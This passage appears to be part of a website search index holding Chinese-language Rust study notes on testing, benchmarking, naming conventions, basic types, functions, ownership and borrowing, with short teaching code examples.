\u76ee\u5f55\u4e0b\u7684\u5b50\u76ee\u5f55\u4e2d\u7684\u6587\u4ef6\u4e0d\u4f1a\u88ab\u5f53\u4f5c\u72ec\u7acb\u7684\u5305\u4e5f\u4e0d\u4f1a\u6709\u6d4b\u8bd5\u8f93\u51fa\uff0c\u53ef\u4ee5\u901a\u8fc7\u5b50\u76ee\u5f55\u521b\u5efa\u6a21\u5757\u6765\u5b58\u653e\u6d4b\u8bd5\u65f6\u4f1a\u4f7f\u7528\u4f46\u4e0d\u5e0c\u671b\u88ab\u6d4b\u8bd5\u7684\u4ee3\u7801 cargo test cargo test \u6267\u884c\u6240\u6709\u6d4b\u8bd5 \u5355\u5143\u6d4b\u8bd5\u3001\u96c6\u6210\u6d4b\u8bd5\u3001\u6587\u6863\u6d4b\u8bd5 \u4f7f\u7528 -- \u9644\u52a0\u53c2\u6570 -- \u540e\u52a0 --test-threads=... \u6765\u6307\u5b9a\u8fdb\u884c\u6d4b\u8bd5\u7684\u7ebf\u7a0b\u6570 -- \u540e\u52a0 --show-output \u6765\u8f93\u51fa\u6807\u51c6\u8f93\u51fa\u4e2d\u5185\u5bb9 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6d4b\u8bd5\u65f6\u5982\u679c\u901a\u8fc7\u5219\u6807\u51c6\u8f93\u51fa\u7684\u5185\u5bb9\u4e0d\u4f1a\u663e\u793a\u51fa\u6765 -- \u540e\u52a0 --ignored \u6765\u4ec5\u8fd0\u884c\u5ffd\u7565\u7684\u6d4b\u8bd5 -- \u540e\u52a0 --no-run \u4ec5\u7f16\u8bd1\u51fa\u6d4b\u8bd5\u4e8c\u8fdb\u5236\u6587\u4ef6\u800c\u4e0d\u8fd0\u884c \u8fd0\u884c\u90e8\u5206\u6d4b\u8bd5 cargo test name \u6765\u8fd0\u884c\u51fd\u6570\u540d\u91cc\u5305\u542b name \u7684\u6d4b\u8bd5\u51fd\u6570 \u6a21\u5757\u540d\u4e5f\u5305\u542b\u5728\u5176\u4e2d\uff0c\u6240\u4ee5\u53ef\u4ee5\u4f9d\u6b64\u5206\u6a21\u5757\u8fdb\u884c\u6d4b\u8bd5 Cargo.toml \u4e2d\u52a0\u5165 [dev-dependencies] \u6307\u5b9a\u4ec5\u5728 test \u65f6\u4f1a\u7528\u5230\u7684\u4f9d\u8d56 cargo test \u65f6\u4f1a\u751f\u6210\u53ef\u8fd0\u884c\u6d4b\u8bd5\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4fdd\u5b58\u5728 target/debug/deps/ \u4e2d \u57fa\u51c6\u6d4b\u8bd5 benchmark \u5b98\u65b9 benchmark \u53ea\u80fd\u5728\u975e stable \u7248\u672c\u4e0b\u4f7f\u7528\uff0c\u9700\u8981\u5f15\u5165\u7279\u6027 #![feature(test)] \u548c test \u4e00\u6837\u5199\u5728 #[cfg(test)] \u4e2d\uff0c\u4f46\u4e0d\u6807\u8bb0\u4e3a #[test] \u800c\u662f #[bench] #[bench] fn bench_test ( b : & mut Bencher ) { b . iter ( || .. .); } \u521d\u59cb\u5316\u4ee3\u7801\u8981\u5199\u5728 iter \u4e4b\u5916\uff0c\u5426\u5219\u4f1a\u591a\u6b21\u5faa\u73af cargo test \u4f1a\u6267\u884c benchmark \u90e8\u5206\u4f46\u4e0d\u4f1a\u6709\u6027\u80fd\u6d4b\u8bd5\u7684\u8f93\u51fa\u7ed3\u679c \u901a\u8fc7 cargo bench \u6765\u6267\u884c benchmark \u4ee3\u7801\uff0c\u6b64\u65f6\u975e bench \u7684 test \u4f1a\u88ab ignore LLVM \u4f1a\u5c06\u6ca1\u6709\u526f\u4f5c\u7528\u7684\u51fd\u6570\u76f4\u63a5\u4f18\u5316\u5220\u6389\uff0c\u53ef\u4ee5\u4f7f\u7528 test::black_box \u6765\u5305\u88f9\u9632\u6b62\u88ab\u4f18\u5316\uff0c\u5982 b . iter ( || { test :: black_box ( func ( test :: black_box ( arg ))); }) \u4f7f\u7528 criterion.rs\uff08\u63a8\u8350\uff09 \u53ef\u4ee5\u6709\u66f4\u591a\u7684\u5206\u6790\u4fe1\u606f \u5b98\u65b9\u6587\u6863\uff1a https://bheisler.github.io/criterion.rs/book/getting_started.html","title":"Rust \u57fa\u7840\u8bed\u6cd5"},{"location":"cs/pl/rust/basic/#rust","text":"Abstract \u57fa\u7840\u8bed\u6cd5\uff0c\u7b2c\u4e8c\u904d\u5b66\u7684\u65f6\u5019\u505a\u4e86\u70b9\u7b14\u8bb0 \u53c2\u8003\uff1a Rust \u5723\u7ecf\uff0c course.rs The Rust Programming Language\uff0c https://doc.rust-lang.org/book/","title":"Rust \u8bed\u6cd5\u57fa\u7840"},{"location":"cs/pl/rust/basic/#_1","text":"","title":"\u53d8\u91cf"},{"location":"cs/pl/rust/basic/#_2","text":"\u539f\u751f\u6807\u8bc6\u7b26\uff08raw identifiers\uff09 \u5173\u952e\u5b57\u4e0d\u80fd\u4f5c\u4e3a\u6807\u8bc6\u7b26\u540d\u79f0 \u52a0\u4e0a r # \u524d\u7f00\u540e\u53ef\u4ee5\u4f7f\u7528\uff0c\u6bd4\u5982 r # match \u547d\u540d\u89c4\u8303\uff1a \u7c7b\u578b \u60ef\u4f8b\u65b9\u5f0f \u6a21\u5757 Modules snake_case \u7c7b\u578b Types UpperCamelCase \u7279\u5f81 Traits UpperCamelCase \u679a\u4e3e Enumerations UpperCamelCase \u7ed3\u6784\u4f53 Structs UpperCamelCase \u51fd\u6570 Functions snake_case \u65b9\u6cd5 Methods snake_case \u901a\u7528\u6784\u9020\u5668 General constructors new or with_more_details \u8f6c\u6362\u6784\u9020\u5668 Conversion constructors from_some_other_type \u5b8f Macros snake_case! \u5c40\u90e8\u53d8\u91cf Local variables snake_case \u9759\u6001\u7c7b\u578b Statics SCREAMING_SNAKE_CASE \u5e38\u91cf Constants SCREAMING_SNAKE_CASE \u7c7b\u578b\u53c2\u6570 Type parameters UpperCamelCase \uff0c\u901a\u5e38\u4f7f\u7528\u4e00\u4e2a\u5927\u5199\u5b57\u6bcd: T \u751f\u547d\u5468\u671f Lifetimes \u901a\u5e38\u4f7f\u7528\u5c0f\u5199\u5b57\u6bcd: 'a\uff0c'de\uff0c'src","title":"\u6807\u8bc6\u7b26\u547d\u540d"},{"location":"cs/pl/rust/basic/#_3","text":"rust \u4f7f\u7528 let \u5173\u952e\u5b57\u6765\u8fdb\u884c\u53d8\u91cf\u7ed1\u5b9a\uff0c\u5373 let a = 1 ; \u800c rust \u7684\u53d8\u91cf\u9ed8\u8ba4\u662f\u4e0d\u53ef\u53d8\uff08immutable\uff09\u7684\uff0c\u4f7f\u4e4b\u53d8\u6210\u53ef\u53d8\u7684\u9700\u8981\u5728 let \u540e\u9762\u52a0\u4e0a mut\uff0c\u5982\u679c\u540e\u9762\u4e0d\u4f1a\u6539\u53d8\u7684\u53d8\u91cf\u88ab\u58f0\u660e\u4e3a\u4e86 mutable \u7684\uff0c\u7f16\u8bd1\u5668\u4f1a\u7ed9\u51fa\u8b66\u544a \u5b58\u5728\u6ca1\u6709\u4f7f\u7528\u7684\u53d8\u91cf\u7684\u8bdd\u7f16\u8bd1\u5668\u4e5f\u4f1a\u7ed9\u51fa\u8b66\u544a\uff0c\u5728\u53d8\u91cf\u540d\u524d\u52a0\u4e0a\u5355\u4e0b\u5212\u7ebf\u5373\u53ef\u5ffd\u7565","title":"\u53d8\u91cf\u7ed1\u5b9a\u4e0e\u53ef\u53d8\u6027"},{"location":"cs/pl/rust/basic/#_4","text":"\u7c7b\u4f3c\u4e8e python \u7684\u5143\u7d20\u89e3\u5305 let ( a , mut b ) : ( bool , bool ) = ( true , false ); let ( a , b , c , d ); ( a , b ) = ( 1 , 2 ); [ c , .. , d , _ ] = [ 1 , 2 , 3 , 4 , 5 ]; // c = 1, d = 4","title":"\u53d8\u91cf\u89e3\u6784"},{"location":"cs/pl/rust/basic/#_5","text":"\u5e38\u91cf\u4f7f\u7528 const \u5173\u952e\u5b57\u6765\u5b9a\u4e49\uff0c\u4e14\u5fc5\u987b\u6307\u5b9a\u7c7b\u578b\uff0c\u547d\u540d\u901a\u5e38\u4e3a\u86c7\u5f62\u5168\u5927\u5199\uff0cconst \u540e\u9762\u4e5f\u4e0d\u5141\u8bb8\u4f7f\u7528 mut\uff0c\u53ef\u4ee5\u5728\u4efb\u610f\u4f5c\u7528\u57df\u5185\u58f0\u660e const MAX_VALUE : u32 = 100_000 ;","title":"\u5e38\u91cf"},{"location":"cs/pl/rust/basic/#_6","text":"rust \u4e2d\u53ef\u4ee5\u91cd\u590d\u58f0\u660e\u540c\u4e00\u540d\u79f0\u7684\u53d8\u91cf\uff0c\u8fd9\u4f1a\u518d\u6b21\u5206\u914d\u5185\u5b58\uff0c\u5e76\u5b8c\u5168\u906e\u853d\u6389\u524d\u9762\u7684\u540c\u540d\u53d8\u91cf","title":"\u53d8\u91cf\u906e\u853d"},{"location":"cs/pl/rust/basic/#_7","text":"","title":"\u57fa\u672c\u7c7b\u578b"},{"location":"cs/pl/rust/basic/#_8","text":"i \u957f\u5ea6 \uff08\u6709\u7b26\u53f7\uff09\u3001u \u957f\u5ea6 \uff08\u65e0\u7b26\u53f7\uff09 i8\u3001i16\u3001i32\u3001i64\u3001i128\u3001u8\u3001u16\u3001u32\u3001u64\u3001u128 isize\u3001usize \u957f\u5ea6\u7531 CPU \u51b3\u5b9a\uff0c32 \u4f4d CPU \u5219\u662f 32 \u4f4d\uff0c64 \u4f4d CPU \u5219\u662f 64 \u4f4d \u6574\u578b\u5b57\u9762\u91cf\u4e2d\u95f4\u53ef\u4ee5\u63d2\u5165 _ \u5b57\u9762\u91cf\u7ed3\u5c3e\u53ef\u4ee5\u63a5\u7c7b\u578b\uff0c\u4f8b\u5982 10 i32 , 10_ i32 \u5b57\u9762\u91cf\uff0c\u5341\u516d\u8fdb\u5236 0x...\u3001\u516b\u8fdb\u5236 0o...\u3001\u4e8c\u8fdb\u5236 0b...\u3001\u5b57\u8282\uff08\u4ec5 u8\uff09b'A' \u6574\u578b\u9ed8\u8ba4\u4f7f\u7528 i32 \u7c7b\u578b \u4f7f\u7528 as \u6765\u8f6c\u6362\u7c7b\u578b\uff0c\u4f8b\u5982 let a : u16 = 1_ u8 as u16 ; debug \u6a21\u5f0f\u7f16\u8bd1\u65f6\u4ea7\u751f\u6ea2\u51fa\u4f1a panic\uff0c\u800c\u5728 release \u6a21\u5f0f\u4e0b\u5219\u4e0d\u4f1a panic\uff0c\u6309\u7167\u8865\u7801\u5faa\u73af\u6ea2\u51fa\u3002\u4f46\u4e0d\u80fd\u4f9d\u8d56\u8fd9\u79cd\u884c\u4e3a\uff0c\u60f3\u8981\u8fd9\u6837\u7684\u6548\u679c\u5e94\u8be5\u6807\u51c6\u5e93\u7684\u4e00\u4e9b\u65b9\u6cd5\uff1a wrapping_ * \u65b9\u6cd5\uff0c\u6309\u7167\u8865\u7801\u5faa\u73af\u6ea2\u51fa\uff0c\u4f8b\u5982 a . wrapping_add ( 1 ) checked_ * \u65b9\u6cd5\uff0c\u5982\u679c\u4ea7\u751f\u6ea2\u51fa\u4e86\uff0c\u5219\u4f1a\u8fd4\u56de None overflowing_ * \u65b9\u6cd5\uff0c\u8fd4\u56de\u7ed3\u679c\u4ee5\u53ca\u6307\u793a\u662f\u5426\u6ea2\u51fa\u7684\u5e03\u5c14\u503c saturating_ * \u65b9\u6cd5\uff0c\u5982\u679c\u4f1a\u6ea2\u51fa\u5219\u4fdd\u6301\u5728\u6700\u5927/\u6700\u5c0f\u503c\u4e0a","title":"\u6574\u578b"},{"location":"cs/pl/rust/basic/#_9","text":"\u7c7b\u578b\u540d\u4e3a bool\uff0c\u503c\u4e3a true \u6216 false\uff0c\u5360\u7528 1 \u5b57\u8282\u5185\u5b58","title":"\u5e03\u5c14\u7c7b\u578b"},{"location":"cs/pl/rust/basic/#_10","text":"f32 \u5355\u7cbe\u5ea6\u6d6e\u70b9\u578b\u3001f64 \u53cc\u7cbe\u5ea6\u6d6e\u70b9\u578b\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4e3a f64 \u5e94\u8be5\u907f\u514d\u5224\u65ad\u6d6e\u70b9\u6570\u76f8\u7b49 \u53ef\u4ee5\u4f7f\u7528 .is_nan() \u65b9\u6cd5\u6765\u5224\u65ad\u4e00\u4e2a\u6570\u503c\u662f\u5426\u662f NaN \u6570\u503c\u4e0a\u4e5f\u53ef\u4ee5\u4f7f\u7528\u65b9\u6cd5\uff0c\u6bd4\u5982 3.14_ f32 . round ()","title":"\u6d6e\u70b9\u578b"},{"location":"cs/pl/rust/basic/#_11","text":"+ - * / % \uff1a\u52a0\u51cf\u4e58\u9664\u53d6\u6a21 & | ^ ! << >> \uff1a\u4f4d\u8fd0\u7b97 \u540c\u6837\u7c7b\u578b\u624d\u80fd\u8fdb\u884c\u8ba1\u7b97\u3001\u7c7b\u578b\u8f6c\u6362\u5fc5\u987b\u662f\u663e\u5f0f\u7684 \u5176\u5b83\u8fd0\u7b97\u53ef\u4ee5\u901a\u8fc7\u65b9\u6cd5\u5b9e\u73b0\uff0c.pow() \u8ba1\u7b97\u6307\u6570\uff0c.log() \u53d6\u5bf9\u6570\u3001.div_euclid() \u6574\u9664\u3001.div_floor() \u7b49\u7b49","title":"\u8fd0\u7b97"},{"location":"cs/pl/rust/basic/#_12","text":"\u5728 for \u5faa\u73af\u4e2d\u5e38\u7528\uff0c\u7528\u6765\u751f\u6210\u8fde\u7eed\u7684\u6570\u503c\uff0c\u4ec5\u53ef\u4ee5\u4f7f\u7528\u6574\u6570\u3001\u5b57\u7b26\u7b49\u8fde\u7eed\u7684\u7c7b\u578b\uff0c\u4f8b\u5982\uff1a for i in 1 .. 5 { .. .; // i = 1, 2, 3, 4 } for j in 'a' ..= 'd' { .. .; // i = 'a', 'b', 'c', 'd' }","title":"\u5e8f\u5217"},{"location":"cs/pl/rust/basic/#_13","text":"rust \u4e2d\u7684\u5b57\u7b26\u7c7b\u578b\u662f char\uff0c\u5b57\u9762\u91cf\u5199\u6cd5\u4e3a\u5355\u5f15\u53f7\uff08\u53cc\u5f15\u53f7\u8868\u793a\u5b57\u7b26\u4e32\uff09 \u4e00\u4e2a char \u5360\u56db\u4e2a\u5b57\u8282\uff08\u800c\u4e0d\u662f C/C++ \u4e2d\u7684\u4e00\u4e2a\u5b57\u8282\uff09 \u6240\u6709 unicode \u7801\u5143\u90fd\u662f\u4e00\u4e2a\u5b57\u7b26 \u76f4\u63a5\u5b58\u50a8 unicode \u503c\uff08\u5373 UCS-4\uff09\uff0c\u800c\u4e0d\u4f7f\u7528 UTF-8 \u7f16\u7801","title":"\u5b57\u7b26\u7c7b\u578b"},{"location":"cs/pl/rust/basic/#_14","text":"\u5355\u5143\u7c7b\u578b\u5c31\u662f ()\uff0c\u552f\u4e00\u7684\u503c\u4e5f\u662f ()\uff0c\u4e0d\u5360\u5185\u5b58 main \u51fd\u6570\u8fd4\u56de\u7684\u5c31\u662f\u5355\u5143\u7c7b\u578b ()","title":"\u5355\u5143\u7c7b\u578b"},{"location":"cs/pl/rust/basic/#_15","text":"\u7b80\u5355\u7406\u89e3\u5c31\u662f\uff0c\u5e26\u5206\u53f7\u7684\u662f\u4e00\u4e2a\u8bed\u53e5\uff0c\u4e0d\u5e26\u5206\u53f7\u7684\u662f\u4e00\u4e2a\u8868\u8fbe\u5f0f\uff0c\u80fd\u8fd4\u56de\u503c\u7684\u5c31\u662f\u8868\u8fbe\u5f0f \u8868\u8fbe\u5f0f\u53ef\u4ee5\u662f\u8bed\u53e5\u7684\u4e00\u90e8\u5206\uff0c\u6bd4\u5982 let a = 1 ; \u4e2d 1 \u5c31\u662f\u4e00\u4e2a\u8868\u8fbe\u5f0f\uff0c\u800c\u6574\u4f53\u662f\u4e00\u4e2a\u8bed\u53e5 \u51fd\u6570\u8c03\u7528\u662f\u8868\u8fbe\u5f0f\uff0c\u56e0\u4e3a\u4f1a\u6709\u8fd4\u56de\u503c\uff0c\u5373\u4f7f\u201c\u65e0\u201d\u8fd4\u56de\u503c\u4e5f\u4f1a\u8fd4\u56de\u5355\u5143\u7c7b\u578b \u7528\u5927\u62ec\u53f7\u5305\u88f9\u7684\u8fd4\u56de\u4e00\u4e2a\u503c\u7684\u8bed\u53e5\u5757\u4e5f\u662f\u8868\u8fbe\u5f0f\uff1a let a = { let b = 1 ; b + 1 };","title":"\u8bed\u53e5\u4e0e\u8868\u8fbe\u5f0f"},{"location":"cs/pl/rust/basic/#_16","text":"fn add ( i : i32 , j : i32 ) -> i32 { i + j // \u4e0d\u5e26\u5206\u53f7\uff0c\u8fd4\u56de\u503c\uff1b\u5e26\u5206\u53f7\u4e86\u4f1a\u8fd4\u56de () } \u5b9a\u4e49\u51fd\u6570\u4f7f\u7528\u5173\u952e\u5b57 fn \u51fd\u6570\u540d\u3001\u53c2\u6570\u540d\u4f7f\u7528\u86c7\u5f62\u547d\u540d \u5fc5\u987b\u663e\u5f0f\u6307\u5b9a\u53c2\u6570\u7c7b\u578b\uff0c\u9664\u4e86\u8fd4\u56de () \u5916\u8981\u663e\u5f0f\u6307\u5b9a\u8fd4\u56de\u503c\u7c7b\u578b \u4e2d\u9014\u8fd4\u56de\u4f7f\u7528 return \u5173\u952e\u5b57\uff08\u5e26\u4e0d\u5e26\u5206\u53f7\u5747\u53ef\uff09 \u6c38\u4e0d\u8fd4\u56de\u7684\u51fd\u6570\u7c7b\u578b\u4e3a !\uff08\u76f8\u5f53\u4e8e python \u7c7b\u578b\u6807\u6ce8\u4e2d\u7684 NoReturn\uff09\uff0c\u4e00\u822c\u7528\u4e8e\u4e00\u5b9a\u4f1a\u629b\u51fa panic \u7684\u51fd\u6570\u6216\u8005\u65e0\u9650\u5faa\u73af\uff1a fn dead_end () -> ! { panic! ( \"...\" ); } fn forever () -> ! { loop { /*...*/ }; }","title":"\u51fd\u6570"},{"location":"cs/pl/rust/basic/#_17","text":"","title":"\u6240\u6709\u6743\u4e0e\u501f\u7528"},{"location":"cs/pl/rust/basic/#_18","text":"Rust \u4e2d\u6bcf\u4e00\u4e2a\u503c\u90fd\u88ab\u4e00\u4e2a\u53d8\u91cf\u6240\u62e5\u6709\uff0c\u8be5\u53d8\u91cf\u88ab\u79f0\u4e3a\u503c\u7684\u6240\u6709\u8005 \u4e00\u4e2a\u503c\u540c\u65f6\u53ea\u80fd\u88ab\u4e00\u4e2a\u53d8\u91cf\u6240\u62e5\u6709\uff0c\u6216\u8005\u8bf4\u4e00\u4e2a\u503c\u53ea\u80fd\u62e5\u6709\u4e00\u4e2a\u6240\u6709\u8005 \u5f53\u6240\u6709\u8005\uff08\u53d8\u91cf\uff09\u79bb\u5f00\u4f5c\u7528\u57df\u8303\u56f4\u65f6\uff0c\u8fd9\u4e2a\u503c\u5c06\u88ab\u4e22\u5f03\uff08drop\uff09 \u5176\u4e2d\u4f5c\u7528\u57df\u7684\u6982\u5ff5\u548c\u5176\u4ed6\u8bed\u8a00\u7c7b\u4f3c","title":"\u6240\u6709\u6743"},{"location":"cs/pl/rust/basic/#string","text":"let s = \"abc\" \u4e2d s \u7684\u7c7b\u578b\u4e3a & str \uff0c\u5e76\u4e0d\u662f String\uff0c\"abc\" \u662f\u88ab\u786c\u7f16\u7801\u7684\u4e0d\u53ef\u53d8\u7684\u5b57\u9762\u91cf\u3002\u5b58\u50a8\u7684\u65f6\u5019\u662f\u4e00\u4e2a\u6307\u9488\u548c\u5b57\u7b26\u4e32\u957f\u5ea6 \u800c String \u5219\u662f\u901a\u8fc7\u5806\u6765\u52a8\u6001\u5206\u914d\u5185\u5b58\u3002\u6bd4\u5982 let s = String :: from ( \"abc\" ) \uff0c\u8c03\u7528 String \u7684 from \u65b9\u6cd5\u6765\u521b\u5efa\u4e00\u4e2a String \u5982\u679c s \u662f mut \u7684\uff0c\u5219\u53ef\u4ee5\u901a\u8fc7 s . push_str ( \"...\" ) \u6765\u8ffd\u52a0\u5b57\u9762\u91cf","title":"String \u7c7b\u578b"},{"location":"cs/pl/rust/basic/#_19","text":"let x = 1 ; let y = x ; \u56e0\u4e3a i32 \u5b58\u50a8\u5728\u6808\u4e0a\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u62f7\u8d1d\uff0cx \u548c y \u90fd\u4e3a 1\uff0c\u4f46 let x = String :: from ( \"abc\" ); let y = x ; String \u5b58\u50a8\u5728\u5806\u4e0a\uff0c\u4e3a y \u8d4b\u503c\u672c\u5e94\u62f7\u8d1d\u5730\u5740\u4f5c\u6d45\u590d\u5236\uff0c\u4f46\u8fd9\u6837\u540c\u4e00\u4e2a String \u5c31\u6709\u4e86\u4e24\u4e2a\u6240\u6709\u8005\uff08x \u548c y\uff09\uff0c\u8fd9\u662f\u6240\u6709\u6743\u89c4\u5219\u4e0d\u5141\u8bb8\u7684\u3002\u56e0\u6b64\u8fd9\u65f6 x \u4f1a\u5931\u6548\uff0c\u4e5f\u5c31\u662f\u5c06 String \u7684\u6240\u6709\u6743\u8f6c\u79fb\u7ed9 y\uff0c\u540e\u9762\u65e0\u6cd5\u518d\u4f7f\u7528 x \u53d8\u91cf\u3002\u8fd9\u79cd\u64cd\u4f5c\u53eb\u505a\u79fb\u52a8\uff08move\uff09\u800c\u975e\u62f7\u8d1d let x : & str = \"abc\" ; let y = x ; \u8fd9\u79cd\u60c5\u51b5\uff0c\u56e0\u4e3a\u4f7f\u7528\u7684\u662f &str \u800c\u4e0d\u662f String\uff0c\u6240\u4ee5 x \u4ec5\u5f15\u7528\u4e86\u5b58\u50a8\u5728\u5185\u5b58\u4e2d\u7684\u5b57\u7b26\u4e32\uff0c\u5e76\u4e0d\u5bf9\u5b83\u6301\u6709\u6240\u6709\u6743\uff0c\u56e0\u6b64 let y = x \u65f6\u5bf9\u5b58\u5728\u6808\u4e0a\u7684\u5f15\u7528\u8fdb\u884c\u4e86\u62f7\u8d1d\uff0c\u800c\u4e0d\u9700\u8981\u79fb\u52a8\u3002\u6240\u4ee5\u8fd9\u4e4b\u540e x \u548c y \u5747\u53ef\u7528 rust \u6c38\u8fdc\u4e0d\u4f1a\u81ea\u52a8\u521b\u5efa\u6570\u636e\u7684\u6df1\u62f7\u8d1d \u4f7f\u7528 .clone() \u53ef\u4ee5\u6df1\u62f7\u8d1d\u5b58\u5728\u5806\u4e0a\u7684\u6570\u636e\uff0c\u4f46\u6027\u80fd\u964d\u4f4e let x = String :: from ( \"abc\" ); let y = x . clone (); // \u540e\u9762 x\u3001y \u5747\u53ef\u7528\uff0c\u56e0\u4e3a\u662f\u6240\u6709\u7684\u662f\u4e0d\u540c\u6570\u636e","title":"\u6240\u6709\u6743\u8f6c\u79fb"},{"location":"cs/pl/rust/basic/#_20","text":"\u5411\u51fd\u6570\u4e2d\u4f20\u503c\u4e5f\u4f1a\u53d1\u751f\u79fb\u52a8\u6216\u8005\u590d\u5236 fn main () { let s = String :: from ( \"abc\" ); print ( s ); // \u8fd9\u91cc s \u5c06\u4e0d\u80fd\u4f7f\u7528 } fn print ( string : String ) { println! ( \"{}\" , string ); // s \u7684\u6240\u6709\u6743\u5230\u8fd9\u91cc } // string \u88ab\u91ca\u653e \u4ece\u4e0a\u9762\u7684\u4f8b\u5b50\u53ef\u4ee5\u770b\u51fa\uff0cs \u5bf9\u4e8e String \u7684\u6240\u6709\u6743\u5728\u51fd\u6570\u4f20\u503c\u8c03\u7528\u65f6\u88ab\u79fb\u52a8\u7ed9\u4e86 print \u51fd\u6570\u7684 string \u53d8\u91cf\u3002\u7136\u540e\u968f\u7740 print \u51fd\u6570\u7684\u7ed3\u675f\uff0cstring \u4f5c\u7528\u57df\u7ed3\u675f\uff0c\u8fd9\u4e2a\u503c\u5185\u5b58\u88ab drop\u3002\u5e76\u4e14\u7531\u4e8e\u5728\u8c03\u7528\u65f6 s \u88ab\u79fb\u52a8\u4e86\uff0c\u6240\u4ee5\u5728\u8c03\u7528\u540e s \u5c06\u4e0d\u80fd\u88ab\u4f7f\u7528\u3002\u82e5\u60f3\u5728\u8c03\u7528\u540e\u7ee7\u7eed\u4f7f\u7528 s\uff0c\u4e00\u79cd\u65b9\u6cd5\u662f\u5c06 s.clone() \u4f20\u7ed9 print\uff0c\u53e6\u4e00\u79cd\u65b9\u6cd5\u5219\u662f\u5229\u7528\u8fd4\u56de\uff1a fn main () { let mut s = String :: from ( \"abc\" ); s = print ( s ); println! ( \"{}\" , s ); // \u8fd9\u91cc s \u53ef\u7528 } fn print ( string : String ) -> String { println! ( \"{}\" , string ); string } \u51fd\u6570\u5728\u8fd4\u56de\u7684\u65f6\u5019\u4e5f\u4f1a\u79fb\u52a8\u6240\u6709\u6743\uff0c\u6bd4\u5982\u4e0a\u9762\u4f8b\u5b50\u4e2d\uff0cprint \u51fd\u6570\u7ed3\u675f\u540e\uff0c\u5c06 string \u79fb\u52a8\u4e86\u51fa\u53bb\uff0c\u8d4b\u503c\u7ed9\u4e86 s\uff0c\u8fd9\u65f6 s \u5c31\u62ff\u5230\u4e86\u8fd4\u56de\u503c\u7684\u6240\u6709\u6743\uff0c\u540e\u9762\u4ecd\u53ef\u4ee5\u7ee7\u7eed\u4f7f\u7528\u3002\u4f46\u8fd9\u8981\u6c42 s \u662f mut \u7684\uff08\u56e0\u4e3a\u53d1\u751f\u4e86\u53d8\u5316\uff09\uff0c\u6216\u8005\u4f7f\u7528\u53d8\u91cf\u906e\u853d\uff08 let s = print ( s ) \uff09","title":"\u51fd\u6570\u4f20\u503c\u4e0e\u8fd4\u56de"},{"location":"cs/pl/rust/basic/#_21","text":"rust \u4e2d\u4e5f\u6709\u5f15\u7528\u7684\u6982\u5ff5\uff0c\u83b7\u53d6\u4e00\u4e2a\u53d8\u91cf\u7684\u5f15\u7528\u4e5f\u79f0\u4e3a\u501f\u7528\uff08borrowing\uff09\uff0c\u4f7f\u7528 & \u6765\u8fdb\u884c\u5f15\u7528\uff0c* \u6765\u89e3\u5f15\u7528\uff1a let x : i32 = 1 ; let y : & i32 = & x ; // \u5f15\u7528\u7c7b\u578b assert_eq! ( x , * y ); \u4e5f\u53ef\u4ee5\u901a\u8fc7\u501f\u7528\u6765\u8fdb\u884c\u51fd\u6570\u8c03\u7528\uff0c\u4ece\u800c\u7ef4\u6301\u53c2\u6570\u7684\u6240\u6709\u6743\uff1a fn main () { let s = String :: from ( \"abc\" ); let len = func ( & s ); // \u521b\u5efa s \u7684\u5f15\u7528\uff0c\u5e76\u4f20\u5165 println! ( \"{} {}\" , s , len ); // s \u4ecd\u53ef\u7528 } fn func ( string : & String ) -> usize { // \u63a5\u6536\u5f15\u7528 string . len () // \u76f4\u63a5\u8c03\u7528\u65b9\u6cd5 } // string \u79bb\u5f00\u4f5c\u7528\u57df\uff0c\u4f46\u5b83\u5e76\u4e0d\u62e5\u6709\u4efb\u4f55\u503c\uff0c\u6240\u4ee5\u4e0d\u4f1a\u53d1\u751f\u4ec0\u4e48 \u4f46\u662f\u6b64\u65f6\u7684\u5f15\u7528\u662f\u4e0d\u53ef\u53d8\u5f15\u7528\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u4e0d\u80fd\u5728 func \u51fd\u6570\u4e2d\u8fdb\u884c string . push_str ( \"...\" ) \u4f7f\u7528 &mut \u53ef\u4ee5\u521b\u5efa\u53ef\u53d8\u5f15\u7528\uff0c\u4f8b\u5982\uff1a let mut x : i32 = 1 ; let y : & mut i32 = & mut x ; fn main () { let mut s = String :: from ( \"abc\" ); func ( & mut s ); // \u521b\u5efa s \u7684\u53ef\u53d8\u5f15\u7528 println! ( \"{}\" , s ) // \u8f93\u51fa abc... } fn func ( string : & mut String ) { // \u63a5\u6536\u53ef\u53d8\u5f15\u7528 string . push_str ( \"...\" ) // \u53ef\u4ee5\u8fdb\u884c\u66f4\u6539 } \u4f46\u662f\u5bf9\u4e8e\u53ef\u53d8\u5f15\u7528\uff0crust \u6709\u4e00\u4e9b\u9650\u5236\uff1a \u5728\u540c\u4e00\u4e2a\u4f5c\u7528\u57df\u5185\uff0c\u4e00\u4e2a\u6570\u636e\u53ea\u80fd\u6709\u4e00\u4e2a\u53ef\u53d8\u5f15\u7528 \u53ef\u53d8\u5f15\u7528\u548c\u4e0d\u53ef\u53d8\u5f15\u7528\u4e0d\u80fd\u540c\u65f6\u5b58\u5728 \u8fd9\u6837\u505a\u7684\u76ee\u7684\u662f\u907f\u514d\u4ea7\u751f\u6570\u636e\u7ade\u4e89\uff0c\u4ee5\u53ca\u9632\u6b62\u4e0d\u53ef\u53d8\u5f15\u7528\u7684\u503c\u88ab\u53ef\u53d8\u5f15\u7528\u6240\u6539\u53d8 \u4ee5\u53ca\u5982\u679c\u5b58\u5728\u5f15\u7528\uff0c\u4e14\u540e\u9762\u7528\u5230\u4e86\u8fd9\u4e2a\u5f15\u7528\uff0c\u5219\u88ab\u5f15\u7528\u7684\u5373\u4f7f\u662f mut \u7684\uff0c\u4e5f\u4e0d\u80fd\u88ab\u4fee\u6539\uff0c\u4f8b\u5982\uff1a fn main () { let mut x = 1 ; let y = & x ; //borrow later used here println! ( \"{}, {}\" , x , * y ); x = 2 ; // assignment to borrowed `x` occurs here println! ( \"{}, {}\" , x , * y ); // borrow later used here } \u5219\u4f1a\u4ea7\u751f\u5982\u4e0a\u6ce8\u91ca\u4e2d\u7684\u9519\u8bef\uff0c\u800c\u5982\u679c\u5728 x = 2 \u540e\u9762\u6ca1\u6709\u518d\u7528\u5230 y\uff0c\u5219\u662f\u53ef\u4ee5\u901a\u8fc7\u7f16\u8bd1\u6b63\u5e38\u66f4\u6539 x \u7684 